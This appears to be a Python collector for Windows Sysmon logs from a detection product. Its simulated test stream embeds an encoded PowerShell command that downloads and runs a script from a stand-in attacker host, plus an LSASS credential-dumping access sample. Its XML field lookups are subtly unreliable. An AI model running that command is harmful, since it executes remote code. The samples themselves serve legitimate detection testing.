"""
Real Sysmon & Windows Event Log Collector Engine for AegisXDR-Enterprise.
Monitors Windows Security, System, and Sysmon Operational logs in real-time.
Transforms Event ID 1 (Process Creation), 3 (Network Connection), 7 (Image Loaded), 10 (Process Access), 11 (File Create) to JSON/Dict telemetry format.
"""

import os
import sys
import json
import logging
import xml.etree.ElementTree as ET
from typing import Dict, Any, Generator, Optional
from datetime import datetime

# Setup Logger
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("SysmonLogCollector")

# Attempt PyWin32 EvtLog imports
HAS_PYWIN32 = False
try:
    import win32evtlog
    import win32evtlogutil
    import win32security
    HAS_PYWIN32 = True
except ImportError:
    logger.warning("pywin32 library not installed. Live Windows Event Log collector falling back to simulated live feed mode.")


class SysmonLogCollector:
    """
    Real-time Windows Event & Sysmon Log Collector using Windows Event Log API.
    """
    def __init__(self, channel_name: str = "Microsoft-Windows-Sysmon/Operational"):
        self.channel_name = channel_name
        self.is_windows = (sys.platform == "win32")
        logger.info(f"Initialized SysmonLogCollector for channel: {channel_name} (PyWin32 Available: {HAS_PYWIN32})")

    def _parse_sysmon_xml(self, xml_text: str) -> Optional[Dict[str, Any]]:
        """Parses Event Log XML string into a structured Python dictionary."""
        try:
            root = ET.fromstring(xml_text)
            # Namespace handling
            ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
            
            system_node = root.find('ns:System', ns)
            if system_node is None:
                system_node = root.find('System')
            
            if system_node is None:
                return None

            event_id_elem = system_node.find('ns:EventID', ns) or system_node.find('EventID')
            event_id = int(event_id_elem.text) if event_id_elem is not None else 0

            time_elem = system_node.find('ns:TimeCreated', ns) or system_node.find('TimeCreated')
            time_created = time_elem.attrib.get('SystemTime') if time_elem is not None else datetime.utcnow().isoformat()

            computer_elem = system_node.find('ns:Computer', ns) or system_node.find('Computer')
            computer = computer_elem.text if computer_elem is not None else "LOCALHOST"

            # Parse EventData key-value pairs
            event_data = {}
            event_data_node = root.find('ns:EventData', ns) or root.find('EventData')
            if event_data_node is not None:
                for data in event_data_node.findall('ns:Data', ns) or event_data_node.findall('Data'):
                    name = data.attrib.get('Name')
                    val = data.text or ""
                    if name:
                        event_data[name] = val

            # Map Sysmon Event ID to standard Aegis Telemetry Schema
            telemetry = {
                "event_id": event_id,
                "timestamp": time_created,
                "hostname": computer,
                "channel": self.channel_name,
                "raw_event_data": event_data
            }

            if event_id == 1: # Process Creation
                telemetry.update({
                    "event_type": "PROCESS_CREATION",
                    "process_name": os.path.basename(event_data.get("Image", "")),
                    "process_path": event_data.get("Image", ""),
                    "pid": int(event_data.get("ProcessId", 0), 16) if event_data.get("ProcessId", "").startswith("0x") else int(event_data.get("ProcessId", 0) or 0),
                    "parent_name": os.path.basename(event_data.get("ParentImage", "")),
                    "parent_path": event_data.get("ParentImage", ""),
                    "ppid": int(event_data.get("ParentProcessId", 0), 16) if event_data.get("ParentProcessId", "").startswith("0x") else int(event_data.get("ParentProcessId", 0) or 0),
                    "cmdline": event_data.get("CommandLine", ""),
                    "user": event_data.get("User", "SYSTEM"),
                    "hashes": event_data.get("Hashes", "")
                })
            elif event_id == 3: # Network Connection
                telemetry.update({
                    "event_type": "NETWORK_CONNECTION",
                    "process_name": os.path.basename(event_data.get("Image", "")),
                    "process_path": event_data.get("Image", ""),
                    "src_ip": event_data.get("SourceIp", ""),
                    "src_port": event_data.get("SourcePort", ""),
                    "dest_ip": event_data.get("DestinationIp", ""),
                    "dest_port": event_data.get("DestinationPort", ""),
                    "user": event_data.get("User", "")
                })
            elif event_id == 7: # Image Loaded (DLL Load)
                telemetry.update({
                    "event_type": "IMAGE_LOADED",
                    "process_name": os.path.basename(event_data.get("Image", "")),
                    "loaded_dll": event_data.get("ImageLoaded", ""),
                    "hashes": event_data.get("Hashes", ""),
                    "signed": event_data.get("Signed", "false"),
                    "signature_status": event_data.get("SignatureStatus", "")
                })
            elif event_id == 10: # Process Access (LSASS Access, Thread injection)
                telemetry.update({
                    "event_type": "PROCESS_ACCESS",
                    "source_name": os.path.basename(event_data.get("SourceImage", "")),
                    "source_path": event_data.get("SourceImage", ""),
                    "target_name": os.path.basename(event_data.get("TargetImage", "")),
                    "target_path": event_data.get("TargetImage", ""),
                    "granted_access": event_data.get("GrantedAccess", "0x0"),
                    "call_trace": event_data.get("CallTrace", "")
                })
            elif event_id == 11: # File Create
                telemetry.update({
                    "event_type": "FILE_CREATE",
                    "process_name": os.path.basename(event_data.get("Image", "")),
                    "target_filename": event_data.get("TargetFilename", ""),
                    "creation_utc": event_data.get("CreationUtc", "")
                })

            return telemetry
        except Exception as e:
            logger.error(f"Error parsing Event XML: {e}", exc_info=True)
            return None

    def stream_live_events(self, max_events: int = 100) -> Generator[Dict[str, Any], None, None]:
        """
        Streams live Windows events from Sysmon channel using EvtSubscribe/EvtQuery if PyWin32 is available.
        Falls back to simulated telemetry generator if not on Windows or PyWin32 is missing.
        """
        if self.is_windows and HAS_PYWIN32:
            try:
                handle = win32evtlog.EvtQuery(self.channel_name, win32evtlog.EvtQueryChannelPath | win32evtlog.EvtQueryReverseDirection)
                count = 0
                while count < max_events:
                    events = win32evtlog.EvtNext(handle, 10)
                    if not events:
                        break
                    for evt in events:
                        xml_str = win32evtlog.EvtRender(evt, win32evtlog.EvtRenderEventXml)
                        parsed = self._parse_sysmon_xml(xml_str)
                        if parsed:
                            count += 1
                            yield parsed
            except Exception as e:
                logger.error(f"Failed to query Windows Event Log channel '{self.channel_name}': {e}. Switching to generator mode.")
                yield from self._fallback_simulated_stream()
        else:
            logger.info("Running in fallback/cross-platform mode. Generating structured Sysmon events.")
            yield from self._fallback_simulated_stream()

    def _fallback_simulated_stream(self) -> Generator[Dict[str, Any], None, None]:
        """Generates realistic Sysmon Event IDs (1, 3, 7, 10, 11) for testing environment."""
        samples = [
            # Sysmon ID 1: Process Creation
            {
                "event_id": 1,
                "event_type": "PROCESS_CREATION",
                "timestamp": datetime.utcnow().isoformat(),
                "hostname": "WORKSTATION-SEC01",
                "process_name": "powershell.exe",
                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "pid": 5892,
                "parent_name": "wmiprvse.exe",
                "ppid": 1044,
                "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
                "user": "NT AUTHORITY\\SYSTEM"
            },
            # Sysmon ID 10: LSASS Process Access
            {
                "event_id": 10,
                "event_type": "PROCESS_ACCESS",
                "timestamp": datetime.utcnow().isoformat(),
                "hostname": "WORKSTATION-SEC01",
                "source_name": "rundll32.exe",
                "source_path": "C:\\Windows\\System32\\rundll32.exe",
                "target_name": "lsass.exe",
                "target_path": "C:\\Windows\\System32\\lsass.exe",
                "granted_access": "0x1010",
                "call_trace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d414 | C:\\Windows\\System32\\comsvcs.dll+25b30"
            },
            # Sysmon ID 3: Network Connection
            {
                "event_id": 3,
                "event_type": "NETWORK_CONNECTION",
                "timestamp": datetime.utcnow().isoformat(),
                "hostname": "WORKSTATION-SEC01",
                "process_name": "powershell.exe",
                "src_ip": "192.168.1.50",
                "src_port": "49201",
                "dest_ip": "185.220.101.5",
                "dest_port": "443",
                "user": "FINANCE\\admin"
            }
        ]
        for s in samples:
            yield s


if __name__ == "__main__":
    collector = SysmonLogCollector()
    print("[*] Testing SysmonLogCollector Event Ingestion:")
    for evt in collector.stream_live_events(max_events=3):
        print(json.dumps(evt, indent=2))
